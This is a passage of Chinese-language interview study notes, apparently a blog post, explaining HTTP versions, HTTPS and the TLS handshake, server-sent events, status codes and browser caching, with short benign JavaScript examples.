    <content type="html"><![CDATA[<h1 id="面试题总结"><a href="#面试题总结" class="headerlink" title="面试题总结"></a>面试题总结</h1><h2 id="网络和请求篇"><a href="#网络和请求篇" class="headerlink" title="网络和请求篇"></a>网络和请求篇</h2><h3 id="x3D-x3D-1、http协议及发展细节-x3D-x3D"><a href="#x3D-x3D-1、http协议及发展细节-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;1、http协议及发展细节&#x3D;&#x3D;"></a>&#x3D;&#x3D;1、http协议及发展细节&#x3D;&#x3D;</h3><h5 id="http0-9"><a href="#http0-9" class="headerlink" title="http0.9"></a>http0.9</h5><p>因为请求仅一行，又叫单线协议&#x2F;单行版本，仅支持服务器响应html文件</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902152804693-20230902%2015:28:06.png" alt="image-20230902152804693"></p><h5 id="http-1-0"><a href="#http-1-0" class="headerlink" title="http:1.0"></a>http:1.0</h5><ul><li><p>请求加入了http协议标头</p></li><li><p>响应增加了状态码和传输的内容类型</p></li><li><p>依然是单线协议，每次连接只能处理一个请求和一个响应，每次建立物理连接的成本很高，而且服务器遭受不住太多客户端访问，服务器扛不住就会直接报503错误。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902153043910-20230902%2015:30:44.png" alt="image-20230902153043910"></p><h5 id="http1-1"><a href="#http1-1" class="headerlink" title="http1.1"></a>http1.1</h5><ul><li>引入持久连接的概念，指定连接内不会关闭这个连接，可以保持在这个连接上发送多个请求。节省了每次交互都需要握手和挥手的时间。</li><li>问题：http标头冗余问题：每次请求总是带上相同几乎不会变化的http标头。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902153652841-20230902%2015:36:52.png" alt="image-20230902153652841"></p><ul><li>引入流水线概念，在服务器响应前，客户端可以一次性发送多个请求，服务器收到多个请求后，按顺序将准备好的数据返回给客户端</li><li>问题：线头阻塞</li><li>解决办法：浏览器通常保持6个左右的连接，一个连接塞车了，客户端可以通过其他连接继续发送请求。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902153728976-20230902%2015:37:29.png" alt="image-20230902153728976"></p><h5 id="http2-0"><a href="#http2-0" class="headerlink" title="http2.0"></a>http2.0</h5><ul><li>更好的解决了1.0版本的遗留问题和功能补充</li><li>http2.0在应用层改变了传输方式：增加了二进制帧数据处理层，将http标头和数据明文拆分成二进制数据帧，将他们单独或者打包成独立进行传输，到达目的地后，再按照stream id将它们组装起来还原原始数据。<ul><li>好处：简化了osi底层模型的工作（更喜欢数据帧）、规避了大文件传输大小的限制</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902160556385-20230902%2016:05:56.png" alt="image-20230902160556385"></p><ul><li><p><strong>双向流</strong>：客户端以流的方式请求，服务端以流的方式响应，形成双向数据流，数据帧都用stream id做标识，然后按照stream id将多个数据帧识别为一个消息，保证数据的完整性。</p></li><li><p><strong>多路复用</strong>：一个客户端和一个服务器保持一个连接，在该连接上并发传输，就是多路复用。</p></li><li><p>不必按需，先到先组装，解决线头阻塞</p><ul><li>但是，http2.0基于tcp，tcp为了保证消息可靠，是按顺序传递的，就有可能造成塞车。</li></ul></li><li><p><strong>服务器推送功能</strong>：可以推送未经请求的资源，如SSE，进一步减少了网络请求的数量。</p></li><li><p><strong>标头压缩功能</strong>：使用hpack来编解码http标头，建立连接的客户端和服务器，双方都维护着相同的61个条目的只读静态表，和可动态添加条目的空白的动态表。</p><ul><li>当请求发送时先查找表中的名值，名值完全匹配，直接提取该标头在表中对应的整数索引，用于表示该名值对。</li><li>如果只匹配名称，就使用索引表示名称，值使用霍夫曼算法编码后表示。</li><li>表中没有的，则按照顺序添加到动态表中，再使用霍夫曼算法编码名值后，传递给服务器。</li><li>服务器端则反之，使用表中的索引解码，或按顺序使用霍夫曼算法解码后添加到服务器动态表中。保证双方表中保存的数据和整数索引一致。</li><li>好处：在之后的请求中，标头会越来越小</li><li>问题：也会造成线头阻塞</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902160350456-20230902%2016:03:50.png" alt="image-20230902160350456"></p><h5 id="http3-0"><a href="#http3-0" class="headerlink" title="http3.0"></a>http3.0</h5><ul><li><strong>使用传输效率更高的udp</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902161830166-20230902%2016:18:30.png" alt="image-20230902161830166"></p><ul><li><strong>使用基于udp的QUIC协议</strong>：实现了tcp的可靠性、拥塞控制、流量控制、排序；保留了http2.0基于流的多路复用及其他优化功能</li><li>http2.0和http3.0数据流处理的区别</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902162140860-20230902%2016:21:41.png" alt="image-20230902162140860"></p><ul><li><p><strong>使用独立指令流</strong>：解决hpack按顺序解码容易造成线头阻塞的问题。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902162507875-20230902%2016:25:08.png" alt="image-20230902162507875"></p><ul><li>提前将需要添加的标头项使用添加指令发送给解码方，解码方收到后回复确认标头指令。双方利用动态标头表中标头的状态来确认标头是否完成同步。未被确认的，不被使用。</li></ul></li><li><p><strong>使用 stream id 和 offset 标头</strong>：规避类似tcp的线头阻塞问题</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902162623434-20230919%2016:27:45.png" alt="image-20230902162623434"></p></li></ul><p><strong>优点总结</strong>：</p><ol><li>udp头部仅8字节，优化了交互数据大小提高传输速度</li><li>0往返时间建立连接（但还需要tsl的1rtt）</li><li>QUIC协议使用随机数作为connection id，不受网络变化影响</li></ol><h5 id="HTTP1-1的长连接讲一下"><a href="#HTTP1-1的长连接讲一下" class="headerlink" title="HTTP1.1的长连接讲一下"></a>HTTP1.1的长连接讲一下</h5><p>HTTP&#x2F;1.1的长连接（Keep-Alive连接）是一项协议功能，旨在改善HTTP协议的性能。在HTTP&#x2F;1.0中，每个HTTP请求&#x2F;响应都需要单独建立一个TCP连接，这会导致较高的延迟和资源开销。为了解决这个问题，HTTP&#x2F;1.1引入了长连接的概念。</p><p>长连接的主要思想是在单个TCP连接上允许多个HTTP请求和响应的交互，而不是每个请求都建立一个新的连接。这样可以减少TCP连接的建立和断开所需的时间，并降低了资源开销。下面是HTTP&#x2F;1.1的长连接工作原理：</p><ol><li><p><strong>建立连接：</strong> 客户端通过向服务器发送一个HTTP请求来建立TCP连接，就像在HTTP&#x2F;1.0中一样。</p></li><li><p><strong>多次请求&#x2F;响应：</strong> 与HTTP&#x2F;1.0不同的是，在HTTP&#x2F;1.1中，客户端可以在同一连接上发送多个HTTP请求，而不需要等待之前的请求完成。服务器也可以在同一连接上发送多个HTTP响应，而不需要等待客户端的下一个请求。这种多次请求&#x2F;响应的方式可以交替进行，直到连接关闭。</p></li><li><p><strong>标志头：</strong> HTTP&#x2F;1.1中使用了一些标志头来启用长连接，其中最重要的是 <code>Connection</code> 头。通常，客户端会在请求头中包含 <code>Connection: keep-alive</code>，而服务器则会在响应头中包含 <code>Connection: keep-alive</code>。这告诉客户端和服务器保持连接开启，以便进行多次请求&#x2F;响应。</p></li><li><p><strong>连接超时：</strong> 为了避免长时间保持不活动的连接，HTTP&#x2F;1.1引入了连接超时机制。服务器可以在响应头中包含 <code>Keep-Alive: timeout=seconds</code>，指示客户端在多长时间内保持连接开启，如果没有活动则自动关闭连接。</p></li><li><p><strong>关闭连接：</strong> 当客户端或服务器决定关闭连接时，它可以发送一个带有 <code>Connection: close</code> 标志头的HTTP请求或响应，通知对方即将关闭连接。</p></li></ol><p>长连接的好处包括减少了TCP连接的建立和断开开销，提高了HTTP请求的响应时间，减少了网络拥塞，提高了性能。这种机制在现代Web应用中非常常见，通常默认启用，除非有明确的理由关闭它。但需要注意，长连接并不意味着连接永远保持开启，它仍然会受到连接超时和服务器资源等因素的影响。</p><h5 id="http和https对比"><a href="#http和https对比" class="headerlink" title="http和https对比"></a>http和https对比</h5><p>HTTP（Hypertext Transfer Protocol）和HTTPS（Hypertext Transfer Protocol Secure）都是用于在网络上传输数据的协议，但它们之间存在重要的区别，下面是它们之间的详细对比：</p><ol><li><p><strong>安全性：</strong></p><ul><li>HTTP：HTTP 不提供数据加密和安全性保障，数据在传输过程中是明文可读的，容易被第三方拦截、窃取或篡改。因此，HTTP 不适用于处理敏感信息（如登录凭据、支付信息等）的传输。</li><li>HTTPS：HTTPS 使用了 SSL&#x2F;TLS 协议进行数据加密，因此传输的数据是加密的，保护用户的隐私和安全。HTTPS 被广泛用于安全敏感数据的传输，如在线银行、电子商务等。</li></ul></li><li><p><strong>协议和端口：</strong></p><ul><li>HTTP：使用默认端口 80，通信数据不加密。</li><li>HTTPS：使用默认端口 443，通信数据经过 SSL&#x2F;TLS 加密。</li></ul></li><li><p><strong>证书验证：</strong></p><ul><li>HTTP：不需要服务器证书验证。</li><li>HTTPS：需要使用 SSL&#x2F;TLS 证书来验证服务器的身份，确保用户连接到的是合法的网站。</li></ul></li><li><p><strong>SEO：</strong></p><ul><li>HTTP：搜索引擎在排名网站时可能会考虑安全性因素，不太倾向于非安全的 HTTP 网站。</li><li>HTTPS：搜索引擎通常更喜欢使用 HTTPS 的网站，因为它们提供了更好的安全性。</li></ul></li><li><p><strong>性能：</strong></p><ul><li>HTTP：通常比 HTTPS 更快，因为不需要进行加密和解密操作。</li><li>HTTPS：由于数据加密和证书验证会增加一些额外的计算开销，可能会略微降低性能。</li></ul></li><li><p><strong>信任度：</strong></p><ul><li>HTTP：不提供信任度验证，容易受到中间人攻击。</li><li>HTTPS：通过证书验证确保了数据传输的可信度，减少了中间人攻击的风险。</li></ul></li><li><p><strong>浏览器标识：</strong></p><ul><li>HTTP：在浏览器地址栏中没有安全标志，通常显示为“http:&#x2F;&#x2F;”。</li><li>HTTPS：在浏览器地址栏中显示安全锁标志和协议为“https:&#x2F;&#x2F;”，用户能够明确知道连接是加密的。</li></ul></li><li><p><strong>数据完整性：</strong></p><ul><li>HTTP：不提供数据完整性检查，数据可能在传输过程中被篡改。</li><li>HTTPS：通过加密和校验机制确保数据完整性，防止数据被篡改。</li></ul></li></ol><p>总结来说，HTTPS 是 HTTP 的安全版本，通过加密和证书验证提供了更高的安全性和隐私保护。因此，在传输敏感信息、进行在线交易或保护用户隐私方面，使用 HTTPS 是非常重要的。在现代 Web 开发中，使用 HTTPS 已经成为标准做法，因为它能够保障用户的安全和数据的完整性。</p><p>HTTPS 可以看作是 HTTP 协议和 TLS（Transport Layer Security）协议结合在一起的安全传输协议。HTTPS 实际上是在 HTTP 协议的基础上添加了 TLS 加密层，以确保数据在传输过程中的安全性和隐私保护。</p><h5 id="TLS连接过程"><a href="#TLS连接过程" class="headerlink" title="TLS连接过程"></a>TLS连接过程</h5><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902174849115-20230919%2016:27:45.png" alt="image-20230902174849115"></p><p>TLS（Transport Layer Security）连接是用于在网络上加密和保护数据传输的协议。TLS 的连接过程如下：</p><ol><li><p><strong>客户端发起连接：</strong> 客户端（通常是浏览器）向服务器发起连接请求。客户端会发送一个 <code>ClientHello</code> 消息，其中包含了客户端支持的加密算法、TLS 版本和一些随机数。</p></li><li><p><strong>服务器响应：</strong> 服务器收到客户端的请求后，会回应一个 <code>ServerHello</code> 消息，其中包含了服务器选择的加密算法、TLS 版本和一些随机数。服务器还会发送一个包含其公钥的数字证书，以便客户端验证服务器的身份。</p></li><li><p><strong>客户端验证证书：</strong> 客户端会验证服务器的数字证书的合法性。这包括检查证书是否由受信任的证书颁发机构（CA）签发，证书是否过期，以及证书中的域名是否与请求的域名匹配。如果证书验证失败，客户端会终止连接。</p></li><li><p><strong>密钥交换：</strong> 如果服务器的数字证书验证通过，客户端会生成一个随机的对称密钥（Session Key），用于加密和解密数据。然后，客户端将这个对称密钥用服务器的公钥进行加密，以确保只有服务器能够解密它。</p></li><li><p><strong>数据加密：</strong> 一旦服务器解密了客户端发送的对称密钥，双方都拥有了相同的密钥，可以使用它来加密和解密数据。从此以后，客户端和服务器之间的通信都是通过加密通道进行的。</p></li><li><p><strong>安全通信：</strong> 一旦加密通道建立，客户端和服务器之间的所有数据传输都会在加密的状态下进行。这意味着即使有人拦截了通信，也无法轻易解密和窃取数据。</p></li><li><p><strong>数据传输：</strong> 客户端和服务器之间的数据可以在安全的加密通道上自由传输。客户端和服务器之间的所有请求和响应都以加密形式传输，保护了数据的隐私和完整性。</p></li></ol><p>通过这个过程，TLS 确保了在互联网上的数据传输是安全的，不容易被窃取或篡改。TLS 在安全通信中起着关键的作用，对于保护用户的隐私和防止数据泄漏非常重要，尤其是在进行敏感信息的传输，如登录信息、支付信息等。</p><h5 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h5><p>多路复用（Multiplexing）是HTTP&#x2F;2协议中的一个重要特性，它旨在提高网络性能，减少资源浪费，同时支持更多并发请求。在HTTP&#x2F;1.x中，每个请求都需要建立一个独立的连接，这会导致连接开销和头部信息的冗余。HTTP&#x2F;2的多路复用解决了这些问题。</p><p>以下是多路复用的工作原理和优点：</p><p><strong>工作原理：</strong></p><ol><li><p><strong>单一连接：</strong> 在HTTP&#x2F;2中，客户端和服务器之间仅建立一个TCP连接。</p></li><li><p><strong>多个流：</strong> 在这个单一连接上，可以同时传输多个请求&#x2F;响应数据流（Stream）。每个数据流都有一个唯一的标识符，并且可以独立传输数据。</p></li><li><p><strong>并行传输：</strong> 多路复用允许多个数据流并行传输，不需要等待前一个请求的响应。这意味着多个请求和响应可以同时在同一连接上进行，而无需按顺序排队等待。</p></li><li><p><strong>头部压缩：</strong> HTTP&#x2F;2使用了头部压缩技术（HPACK），可以减小头部信息的大小，减少了传输的冗余数据。这降低了带宽消耗，尤其是对于大量小请求的情况。</p></li></ol><p><strong>优点：</strong></p><ol><li><p><strong>更高的性能：</strong> 多路复用减少了连接建立和断开的开销，提高了请求响应的速度，尤其对于高延迟或高丢包率的网络更为明显。</p></li><li><p><strong>减少了头部开销：</strong> 头部压缩减小了每个请求&#x2F;响应的头部信息大小，减少了带宽的消耗，特别是对于包含大量小请求的场景。</p></li><li><p><strong>更好的并发性：</strong> 多路复用允许并发处理多个请求，而不需要等待之前的请求完成，提高了并发性能。</p></li><li><p><strong>提高了资源利用率：</strong> 多路复用可以充分利用单一连接的资源，减少了不必要的连接建立和断开，降低了服务器资源消耗。</p></li><li><p><strong>支持优先级：</strong> HTTP&#x2F;2允许为每个数据流设置不同的优先级，确保重要的请求能够优先处理。</p></li></ol><p>需要注意的是，虽然多路复用是HTTP&#x2F;2的一项强大特性，但它并不是自动开启的。客户端和服务器都需要支持HTTP&#x2F;2协议，并且在通信中正确使用多路复用功能。多数现代的Web浏览器和Web服务器都已经支持HTTP&#x2F;2，以获得更好的性能和用户体验。</p><h5 id="HTTP3-0多路复用的QUIC"><a href="#HTTP3-0多路复用的QUIC" class="headerlink" title="HTTP3.0多路复用的QUIC"></a>HTTP3.0多路复用的QUIC</h5><p>HTTP&#x2F;3.0是基于QUIC（Quick UDP Internet Connections）协议的一种新一代HTTP协议，它引入了一种改进的多路复用机制。QUIC是一个由Google开发的协议，旨在减少网络延迟，提高连接性能，并增强安全性。以下是HTTP&#x2F;3.0中多路复用的QUIC的一些关键特点和工作原理：</p><p><strong>1. 基于UDP：</strong> HTTP&#x2F;3.0使用了UDP作为传输层协议，而不是像HTTP&#x2F;1.x和HTTP&#x2F;2.0那样使用TCP。UDP具有较低的连接建立和断开开销，适用于移动网络等高延迟、高丢包率的环境。</p><p><strong>2. 快速连接建立：</strong> QUIC具有快速连接建立特性，减少了握手过程的时间，因此可以更快地建立连接和开始数据传输。</p><p><strong>3. 多路复用：</strong> HTTP&#x2F;3.0中的多路复用机制与HTTP&#x2F;2.0类似，允许在同一个连接上同时传输多个请求和响应数据流。每个数据流都有自己的标识符，并且可以独立传输数据。</p><p><strong>4. 无阻塞：</strong> HTTP&#x2F;3.0的多路复用是无阻塞的，这意味着一个数据流的阻塞不会影响其他数据流的传输。这有助于提高并发性能，即使其中一个数据流出现问题，其他数据流仍然可以继续传输。</p><p><strong>5. 流量控制和优先级：</strong> HTTP&#x2F;3.0支持流量控制和优先级设置，可以确保对重要资源的请求得到及时处理。</p><p><strong>6. 0-RTT握手：</strong> HTTP&#x2F;3.0引入了0-RTT（零轮延迟）握手机制，允许客户端在第一次连接时发送加密的数据，进一步减少了连接延迟。</p><p><strong>7. 动态更新：</strong> HTTP&#x2F;3.0的QUIC支持动态更新连接参数，允许协议参数的变更而无需重新建立连接。</p><p>HTTP&#x2F;3.0的多路复用机制基于QUIC的特性，旨在提供更快的连接建立、更高的并发性能、更好的安全性和适应性，特别适用于移动设备和高延迟网络。由于HTTP&#x2F;3.0基于QUIC，因此它具有一些独特的特点，与传统的HTTP协议有显著的不同。这种协议的改进有助于提高Web应用程序的性能和用户体验。</p><h5 id="服务器发送事件（SSE）"><a href="#服务器发送事件（SSE）" class="headerlink" title="服务器发送事件（SSE）"></a>服务器发送事件（SSE）</h5><p>服务器发送事件（SSE）是一种用于在服务器和客户端之间实现单向实时通信的Web技术。SSE允许服务器将数据推送到客户端，而不需要客户端发起请求，这使得它非常适合实现实时通知、即时消息、股票报价、天气更新等应用程序。以下是SSE的基本原理和使用方法：</p><p><strong>SSE的工作原理：</strong></p><ol><li>客户端通过创建一个EventSource对象来建立到服务器的SSE连接。</li><li>一旦连接建立，服务器可以周期性地或基于特定事件向客户端发送数据。</li><li>服务器发送的数据被包装成事件，包括一个事件标识符（event），以及数据内容（data）。</li><li>客户端通过监听特定事件来接收数据，然后可以在收到数据后执行相应的操作。</li></ol><p><strong>SSE的使用步骤：</strong></p><ol><li><p>在服务器端设置SSE端点：在服务器上创建一个支持SSE的端点，这通常是一个HTTP路由，它会向客户端发送SSE事件。</p></li><li><p>在客户端创建EventSource对象：使用JavaScript创建一个EventSource对象，将其连接到服务器端SSE端点。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> eventSource = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventSource</span>(<span class="hljs-string">&#x27;/sse-endpoint&#x27;</span>);<br></code></pre></td></tr></table></figure></li><li><p>监听事件：客户端可以监听服务器发送的事件，当事件到达时执行相应的操作。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">eventSource.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;eventName&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>  <span class="hljs-keyword">var</span> eventData = event.<span class="hljs-property">data</span>;<br>  <span class="hljs-comment">// 处理接收到的事件数据</span><br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p>服务器发送事件：服务器端通过向连接的EventSource发送数据来触发事件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 通过服务器端代码向连接的客户端发送事件</span><br>res.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;event: eventName\n&#x27;</span>);<br>res.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;data: Event data\n\n&#x27;</span>);<br></code></pre></td></tr></table></figure></li><li><p>关闭连接：当不再需要SSE连接时，客户端可以关闭它。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">eventSource.<span class="hljs-title function_">close</span>();<br></code></pre></td></tr></table></figure></li></ol><p><strong>注意事项：</strong></p><ul><li>SSE基于HTTP，因此需要使用HTTP服务器来支持它。</li><li>SSE是单向通信，只能由服务器向客户端发送数据，不支持双向通信。</li><li>SSE不需要使用第三方库或框架，原生JavaScript就可以实现。</li><li>SSE在支持的浏览器中有良好的支持，但可能不适用于所有应用场景。</li></ul><p>总之，服务器发送事件（SSE）是一种用于实现服务器到客户端的实时通信的简单而有效的技术，适用于需要将实时数据推送给客户端的应用程序。由于其简单性和广泛的浏览器支持，它是一种强大的工具。</p><h3 id="x3D-x3D-2、http状态码及含义-x3D-x3D"><a href="#x3D-x3D-2、http状态码及含义-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;2、http状态码及含义&#x3D;&#x3D;"></a>&#x3D;&#x3D;2、http状态码及含义&#x3D;&#x3D;</h3><p>HTTP状态码是指在客户端向服务器发送HTTP请求后，服务器返回的一个三位数字的代码，用于表示请求的处理结果。HTTP状态码的目的是让客户端能够理解服务器对请求的处理情况，以便采取适当的行动。以下是一些常见的HTTP状态码及其含义：</p><p>1xx（信息性状态码）：表示请求已经被接收，继续处理。</p><ul><li>100 Continue：服务器已经接收到请求的头部，并且客户端应继续发送请求的主体部分。</li></ul><p>2xx（成功状态码）：表示请求已经成功被接收、理解、接受。</p><ul><li>200 OK：请求已成功被处理。</li><li>201 Created：请求已成功并且服务器创建了新资源。</li><li>204 No Content：请求成功，但响应中不包含实体的主体部分。</li></ul><p>3xx（重定向状态码）：表示需要客户端采取进一步的操作才能完成请求。</p><ul><li>301 Moved Permanently：资源被永久移动到新的URI，客户端需要使用新的URI重新发起请求。</li><li>302 Found：资源被临时移动到新的URI，客户端需要使用新的URI重新发起请求。</li><li>304 Not Modified：客户端发送了一个条件性的请求，服务器返回资源未被修改。</li></ul><p>4xx（客户端错误状态码）：表示客户端发送的请求有误。</p><ul><li>400 Bad Request：请求无效，服务器无法理解请求的语法。</li><li>401 Unauthorized：请求要求身份验证。</li><li>403 Forbidden：服务器拒绝执行请求。</li><li>404 Not Found：服务器未找到请求的资源。</li></ul><p>5xx（服务器错误状态码）：表示服务器在处理请求的过程中发生了错误。</p><ul><li>500 Internal Server Error：服务器遇到了意外错误，无法完成请求。</li><li>502 Bad Gateway：服务器作为网关或代理，从上游服务器接收到无效的响应。</li><li>503 Service Unavailable：服务器当前无法处理请求，通常是因为过载或维护。</li></ul><p>这些状态码是HTTP协议中的一部分，它们用于在客户端和服务器之间传递关于请求处理的信息。通过查看响应的状态码，可以更好地了解请求的结果，并采取相应的措施，例如重新请求、跳转到新的URL或显示错误信息。</p><h5 id="说一说出现302状态和出现301状态的场景"><a href="#说一说出现302状态和出现301状态的场景" class="headerlink" title="说一说出现302状态和出现301状态的场景"></a>说一说出现302状态和出现301状态的场景</h5><p>HTTP 状态码 301 和 302 都表示重定向（Redirection），但它们的应用场景和行为略有不同：</p><ol><li><p><strong>301 Moved Permanently（永久重定向）</strong>：</p><ul><li>当服务器返回 HTTP 状态码 301 时，表示被请求的资源已经永久移动到了一个新的 URL。</li><li>浏览器会缓存这个重定向，将来的请求都会直接发送到新的 URL。</li><li>301 通常用于告诉搜索引擎和浏览器，该资源的 URL 已永久更改，应将之前的 URL 替换为新的 URL。</li><li>301 重定向通常用于实现网站的 URL 重构或更改，以及更改网站的域名。</li></ul></li><li><p><strong>302 Found（临时重定向）</strong>：</p><ul><li>当服务器返回 HTTP 状态码 302 时，表示被请求的资源已经临时移动到了一个新的 URL。</li><li>浏览器会在每次请求时都跟随这个重定向，不会缓存新的 URL。</li><li>302 通常用于临时性的重定向，告诉浏览器和搜索引擎，该资源的 URL 已临时更改，但未来可能会还原。</li><li>302 重定向用于处理临时性的情况，例如服务器维护、临时性的页面跳转等。</li></ul></li></ol><p>在实际应用中，301 和 302 重定向可以用于不同的场景：</p><ul><li><p>使用 301 重定向时，浏览器会将旧 URL 缓存起来，并将请求重定向到新 URL，搜索引擎也会更新索引。这通常用于处理永久性的 URL 更改，以确保旧链接不会失效。</p></li><li><p>使用 302 重定向时，浏览器不会缓存新 URL，每次都会重新请求。这通常用于处理临时性的页面跳转，例如登录后返回原页面。</p></li></ul><p><strong>HTTP 301 Moved Permanently（永久重定向）</strong>：</p><ol><li><strong>网站 URL 重构</strong>：当网站进行结构性变化或更改 URL 路由时，可以使用 301 重定向来告诉搜索引擎和浏览器，该资源已永久移动到新的 URL。这有助于搜索引擎更新索引并保持用户链接的有效性。</li><li><strong>更改域名</strong>：当网站更改域名时，可以使用 301 重定向来通知用户和搜索引擎，将来自旧域名的请求重定向到新域名。这有助于维护搜索引擎排名和用户体验。</li><li><strong>HTTP 到 HTTPS 的迁移</strong>：当网站从不安全的 HTTP 迁移到安全的 HTTPS 协议时，可以使用 301 重定向来强制所有访问 HTTP 版本的页面跳转到 HTTPS 版本。</li></ol><p><strong>HTTP 302 Found（临时重定向）</strong>：</p><ol><li><strong>登录后跳转</strong>：在网站上，当用户登录后，通常会将他们重定向到之前访问的页面或某个默认页面，这时可以使用 302 临时重定向。</li><li><strong>A&#x2F;B 测试</strong>：在进行 A&#x2F;B 测试时，可以使用 302 重定向来测试不同版本的页面。用户会被随机重定向到不同版本，以便收集数据和评估性能。</li><li><strong>临时性跳转</strong>：一些情况下，需要对某些页面进行临时性跳转，但不希望浏览器缓存重定向的结果。此时可以使用 302 临时重定向。</li></ol><p>需要注意的是，虽然上述场景是 301 和 302 最常见的用法，但具体的使用情况可能因应用程序和业务需求而有所不同。选择正确的重定向状态码很重要，因为它们会影响搜索引擎排名、用户体验和缓存行为。</p><h3 id="x3D-x3D-3、http缓存-x3D-x3D"><a href="#x3D-x3D-3、http缓存-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;3、http缓存&#x3D;&#x3D;"></a>&#x3D;&#x3D;3、http缓存&#x3D;&#x3D;</h3><p>所谓浏览器缓存其实就是指在本地使用的计算机中开辟一个内存区，同时也开辟一个硬盘区作为数据传输的缓冲区，然后用这个缓冲区来暂时保存用户以前访问过的信息。</p><p>HTTP 缓存主要是通过请求和响应报文头中的对应 Header 信息，来控制缓存的策略。</p><p>HTTP缓存可以缩短网页请求资源的距离，减少延迟，节省网络流量，并且由于缓存文件可以重复利用，降低网络负荷，提高客户端响应。</p><p>根据是否需要重新向服务器发起请求，可分为<strong>强缓存和协商缓存</strong></p><h5 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h5><p>定义：当命中强缓存的时候，客户端不会再请求服务器，直接从缓存中读取内容，并返回HTTP状态码200。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/baac76ed978c4218816daf2dfaea2f4d~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>强制缓存，在响应头由 Expires、Cache-Control 和 Pragma控制</p><ul><li>Expires：值为服务器返回的过期时间，浏览器再次加载资源时，如果在这个过期时间内，则命中强缓存。（HTTP1.0的属性，缺点是客户端和服务器时间不一致会导致命中误差）</li><li>Cache-Control：HTTP1.1属性，优先级更高，以下为常用属性<ul><li>no-store： 禁用缓存</li><li>no-cache：不使用强缓存，每次需向服务器验证缓存是否失效</li><li>private&#x2F;public：private指的单个用户，public可以被任何中间人、CDN等缓存</li><li>max-age&#x3D;：max-age是距离请求发起的时间的秒数</li><li>must-revalidate：在缓存过期前可以使用，过期后必须向服务器验证</li></ul></li><li>Pragma<ul><li>no-cache：效果和cache-control等no-cache一致。 优先级Pragma &gt; Cache-Control &gt; Expires</li></ul></li></ul><p>强缓存的资源存储位置</p><table><thead><tr><th>状态</th><th>Network - Size</th><th>含义</th></tr></thead><tbody><tr><td>200</td><td>from memory cache</td><td>不请求网络资源，资源在内存， 一般是脚本、字体、图片，浏览器关闭，数据将被释放</td></tr><tr><td>200</td><td>from disk cache</td><td>请求网络资源，资源在磁盘， 一般是css等，关闭数据还在</td></tr><tr><td>200</td><td>资源大小</td><td>从服务器下载最新资源</td></tr><tr><td>304</td><td>报文大小</td><td>请求服务端发现资源未更新，使用本地资源</td></tr></tbody></table><h5 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h5><p>定义：向服务器发送请求，服务器会根据这个请求的请求头的一些参数来判断是否命中协商缓存，如果命中，则返回304状态码并带上新的响应头通知浏览器从缓存中读取资源</p><p>协商缓存，响应头中有两个字段标记规则</p><ul><li><p>Last-Modified &#x2F; If-Modified-Since</p><ul><li>Last-Modified是浏览器第一个请求资源，服务器响应头字段，是资源文件<strong>最后一次更改时间(精确到秒)。</strong></li><li>下一次发送请求时，请求头里的<strong>If-Modified-Since</strong>就是之前的Last-Modified</li><li>服务器更加最后修改时间判断命中，如果命中，http为304且不返回资源、不返回last-modify</li></ul></li><li><p>Etag &#x2F; If-None-Match：</p><p>Etag 的校验优先级高于 Last-Modified</p><ul><li>Etag是加载资源时，服务器返回的响应头字段，是对资源的唯一标记，值是hash码。</li><li>浏览器在下一次加载资源向服务器发送请求时，会将上一次返回的Etag值放到请求头里的<strong>If-None-Match</strong>里</li><li>服务器接受到If-None-Match的值后，会拿来跟该资源文件的Etag值<strong>做比较</strong>，如果相同，则表示资源文件没有发生改变，命中协商缓存。</li></ul></li></ul><blockquote><p>在精确度上，Etag要优于Last-Modified，Last-Modified的时间单位是秒，如果某个文件在1秒内改变了多次，那么他们的Last-Modified其实并没有体现出来修改，但是Etag每次都会改变确保了精度 在性能上，Etag要逊于Last-Modified，毕竟Last-Modified只需要记录时间，而Etag需要服务器通过算法来计算出一个hash值。 